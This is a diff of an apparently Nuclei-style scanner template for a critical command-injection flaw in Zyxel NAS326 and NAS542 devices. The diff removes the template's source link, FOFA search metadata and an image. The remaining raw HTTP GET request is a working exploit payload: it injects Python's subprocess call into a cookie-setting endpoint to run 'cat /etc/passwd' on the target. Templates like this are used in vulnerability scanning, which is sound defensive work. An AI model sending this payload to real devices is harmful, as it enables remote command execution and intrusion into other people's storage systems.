@@ -3,21 +3,15 @@ info:
   name: Zyxel NAS326、NAS542 命令注入漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/racliihw7ogl0a29'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: racliihw7ogl0a29
-    fofa: app="NAS542" || app="ZYXEL-NAS326"
 http:
 - raw:
   - 'GET /cmd,/simZysh/register_main/setCookie?c0=storage_ext_cgi+CGIGetExtStoInfo+None)+and+False+or+__import__("subprocess").check_output("cat+/etc/passwd",+shell=True)%23 HTTP/1.1
 
     Content-Type: application/json
 
-    Host: {{Hostname}}
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1741521883107-290ab8f1-a796-4b4b-8929-6053a36aab34.png)'
+    Host: {{Hostname}}'
   redirects: false
   matchers:
   - status:
